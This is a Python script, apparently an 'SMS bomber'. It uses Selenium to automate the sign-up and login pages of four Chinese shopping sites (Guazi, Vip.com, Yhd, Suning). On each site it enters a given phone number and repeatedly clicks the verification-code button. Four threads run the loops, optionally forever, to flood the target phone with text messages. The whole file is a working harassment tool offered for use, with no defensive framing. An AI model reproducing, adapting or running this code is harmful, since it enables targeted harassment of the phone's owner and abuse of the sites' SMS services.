from selenium import webdriver
from threading import Thread
import time
import sys
import encodings.idna


def main(phone, count, forever):
    chrome_driver_path = 'chromedriver.exe'

    phone = phone
    count = int(count)
    forever = int(forever)

    if phone is None:
        print('phone 不能为空')
        sys.exit(-1)

    if count is None:
        count = 10

    if forever is None:
        forever = False
    else:
        forever = forever == 1

    bomb = Bomb(phone=phone, driver_path=chrome_driver_path, count=count, forever=forever)
    thread1 = Thread(target=bomb.target1)
    thread2 = Thread(target=bomb.target2)
    thread3 = Thread(target=bomb.target3)
    thread4 = Thread(target=bomb.target4)

    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()


class Bomb(object):
    def __init__(self, phone, driver_path, count=20, forever=False):
        self.phone = phone
        self.send_num = 0
        self.count = count
        self.driver_path = driver_path
        self.forever = forever

    def target1(self):
        while self.count > 0:
            target_name = '瓜子二手车'

            driver = webdriver.Chrome(self.driver_path)
            driver.get('https://www.guazi.com/www/bj/buy')
            # click login
            driver.find_element_by_xpath('//a[@class="uc-my"]').click()
            time.sleep(2)
            # input tel
            driver.find_element_by_xpath('//input[@class="phone-login-input js-phoneNum1"]') \
                .send_keys(self.phone)
            time.sleep(2)
            # send btn
            btn = driver.find_element_by_xpath('//button[@class="get-code"]')
            self.send(btn, target_name=target_name)
            driver.quit()
            time.sleep(60)
            if not self.forever:
                self.count -= 1

    def target2(self):
        while self.count > 0:
            target_name = '唯品会'

            driver = webdriver.Chrome(self.driver_path)
            driver.get('https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F')
            # input tel
            driver.find_element_by_xpath('//input[@placeholder="请输入手机号码"]').send_keys(self.phone)
            # click pwd box
            driver.find_element_by_xpath('//input[@id="J_mobile_pwd"]').click()
            time.sleep(2)
            # send btn
            btn = driver.find_element_by_xpath('//a[@class="vcsi_sms_send"]')
            self.send(btn, target_name=target_name)
            driver.quit()
            time.sleep(60)
            if not self.forever:
                self.count -= 1

    def target3(self):
        while self.count > 0:
            target_name = '1号店'

            driver = webdriver.Chrome(self.driver_path)
            driver.get('https://passport.yhd.com/passport/register_input.do')
            # input username
            driver.find_element_by_xpath('//input[@id="userName"]').send_keys('我来啦asknflgskg')
            time.sleep(1)
            # input tel
            driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
            time.sleep(1)
            # send btn
            btn = driver.find_element_by_xpath('//a[@class="receive_code fl same_code_btn r_disable_code "]')
            time.sleep(1)
            self.send(btn, target_name=target_name)
            driver.quit()
            time.sleep(60)
            if not self.forever:
                self.count -= 1

    def target4(self):
        while self.count > 0:
            target_name = '苏宁'

            driver = webdriver.Chrome(self.driver_path)
            driver.get('https://reg.suning.com/person.do')
            # click agree
            driver.find_element_by_xpath('//a[@class="agree-btn"]').click()
            time.sleep(1)
            # input tel
            driver.find_element_by_xpath('//input[@id="mobileAlias"]').send_keys(self.phone)
            time.sleep(1)
            # send btn
            btn = driver.find_element_by_xpath('//a[@id="sendSmsCode"]')
            time.sleep(1)
            self.send(btn, target_name=target_name)
            driver.quit()
            time.sleep(60)
            if not self.forever:
                self.count -= 1

    def send(self, button, target_name):
        button.click()
        self.send_num += 1
        print(f"[{self.send_num}] 号码[{self.phone}] 目标[{target_name}]")
        time.sleep(5)


if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2], sys.argv[3])
